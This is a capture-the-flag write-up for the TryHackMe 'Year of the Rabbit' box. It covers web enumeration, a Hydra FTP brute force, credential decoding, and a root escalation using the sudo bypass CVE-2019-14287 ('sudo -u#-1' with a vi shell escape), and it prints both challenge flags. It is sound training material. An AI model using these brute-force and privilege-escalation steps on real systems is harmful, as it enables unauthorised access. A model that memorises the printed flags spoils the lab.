# 🐇 Year of the Rabbit — TryHackMe Write-up

**Author:** XENOS  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Date:** April 3, 2026  
**Category:** Web · FTP · Steganography · Privilege Escalation  

---

## Table of Contents

1. [Overview](#overview)
2. [Enumeration](#enumeration)
   - [Port Scan](#port-scan)
   - [Web Enumeration](#web-enumeration)
3. [Foothold](#foothold)
   - [Hidden Directory via Burp Suite](#hidden-directory-via-burp-suite)
   - [Steganography — Extracting the Wordlist](#steganography--extracting-the-wordlist)
   - [FTP Brute Force with Hydra](#ftp-brute-force-with-hydra)
4. [Lateral Movement](#lateral-movement)
   - [FTP → Brainfuck → SSH](#ftp--brainfuck--ssh)
   - [Eli → Gwendoline](#eli--gwendoline)
5. [Privilege Escalation](#privilege-escalation)
   - [CVE-2019-14287 — sudo Bypass](#cve-2019-14287--sudo-bypass)
6. [Flags](#flags)
7. [Summary](#summary)

---

## Overview

**Year of the Rabbit** is a beginner-friendly Linux box that chains together several interesting techniques: CSS source-code snooping, Burp Suite traffic interception, image steganography, FTP brute-forcing, Brainfuck decoding, and a well-known `sudo` CVE. Each step is unconventional enough to keep you thinking.

**Attack Chain:**  
`Web Enum` → `Burp Intercept` → `Steganography` → `FTP Brute Force` → `SSH (Eli)` → `SSH (Gwendoline)` → `CVE-2019-14287` → `Root`

---

## Enumeration

### Port Scan

```bash
nmap -sCV -O -T4 -Pn 10.130.177.211
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.2 |
| 22   | SSH     | OpenSSH 6.7p1 |
| 80   | HTTP    | Apache 2.4.10 |

**Initial observations:**
- FTP anonymous login → **failed**
- SSH requires credentials → **skip for now**
- HTTP → **main attack surface**

---

### Web Enumeration

The web root serves the default Apache2 landing page — but its source code reveals something unusual: it links to an **external stylesheet** instead of using the default inline one.

```
http://10.130.177.211/assets/style.css
```

Inside the stylesheet, a comment leaks a hidden PHP page:

```
/sup3r_s3cr3t_fl4g.php
```

Visiting it directly redirects to a Rick Astley video. Disabling JavaScript reveals a video with an audio clue at the **56-second mark**:

> *"I'll put you out of your misery* **burp** *— you're looking in the wrong place."*

The word **"burp"** is a hint → intercept the request with **Burp Suite**.

---

## Foothold

### Hidden Directory via Burp Suite

With Burp Suite's proxy active, revisiting `/sup3r_s3cr3t_fl4g.php` reveals an intermediate redirect:

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
```

The `hidden_directory` parameter exposes a path. Navigating to it reveals a **directory listing** with one file:

```
Hot_Babe.png
```

---

### Steganography — Extracting the Wordlist

Downloading the image and running `strings` (or `cat`) on it reveals a message buried near the end of the file — around lines 1790–1791:

```
Eh, you've earned this. Username: ftpuser
Password list:
[~80 lines of potential passwords follow]
```

Extract the wordlist:

```bash
sed -n '1792,$p' Hot_Babe.png > wordlist.txt
```

---

### FTP Brute Force with Hydra

```bash
hydra -l ftpuser -P wordlist.txt 10.130.177.211 ftp
```

**Result:** Password cracked.

Login and download the only file in the FTP directory:

```bash
ftp 10.130.177.211
# login with cracked credentials
get Eli's_Creds.txt
```

---

## Lateral Movement

### FTP → Brainfuck → SSH

The contents of `Eli's_Creds.txt` are encoded in **Brainfuck**. Decoding it online yields:

```
User: eli
Pass: <password>
```

SSH in:

```bash
ssh eli@10.130.177.211
```

Login succeeds. The MOTD contains a hint: *Root has left a message for Gwendoline somewhere on the box.*

The user flag is **not** in Eli's home directory.

---

### Eli → Gwendoline

Following the hint, search for hidden directories:

```bash
find / -name "s3cr3t" 2>/dev/null
# → /usr/games/s3cr3t
```

Inside, a hidden file (`.another_secret_message`) contains Gwendoline's credentials — left with **world-readable permissions** by whoever wrote the note.

Switch to Gwendoline and grab the user flag:

```bash
su gwendoline
cat /home/gwendoline/user.txt
```

---

## Privilege Escalation

### CVE-2019-14287 — sudo Bypass

Check sudo permissions:

```bash
sudo -l
```

```
(ALL, !root) /usr/bin/vi /home/gwendoline/user.txt
```

This configuration means Gwendoline can run `vi` as **any user except root**. Normally this blocks the classic `sudo vi → :!/bin/bash` privesc.

**However**, CVE-2019-14287 exploits a flaw in older `sudo` versions: passing a user ID of `-1` causes sudo to interpret it as `0` (root), bypassing the `!root` restriction entirely.

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`, escape to shell:

```
:!/bin/bash
```

**Root shell obtained.** Grab the final flag:

```bash
cat /root/root.txt
```

---

## Flags

| Flag | Value |
|------|-------|
| 🏳️ User | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
| 🚩 Root | `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}` |

---

## Summary

| Step | Technique |
|------|-----------|
| Web recon | CSS source → hidden PHP page |
| Traffic analysis | Burp Suite intercept → hidden directory |
| Steganography | `strings` on PNG → FTP wordlist |
| Brute force | Hydra against FTP |
| Decoding | Brainfuck → SSH credentials |
| Lateral movement | Hidden file with readable permissions |
| Privilege escalation | CVE-2019-14287 (`sudo -u#-1`) |

**Key lessons from this box:**
- Always read page source — external stylesheets on default pages are suspicious
- A "Rick Roll" redirect is not the end of the road; intercept the traffic
- `strings` on any binary/image file before reaching for complex steg tools
- `(ALL, !root)` in sudoers is **not** a safe restriction on unpatched systems

---

*Write-up by **XENOS** | [github.com/obadahamed](https://github.com/obadahamed) | [obadahamed.github.io](https://obadahamed.github.io)*
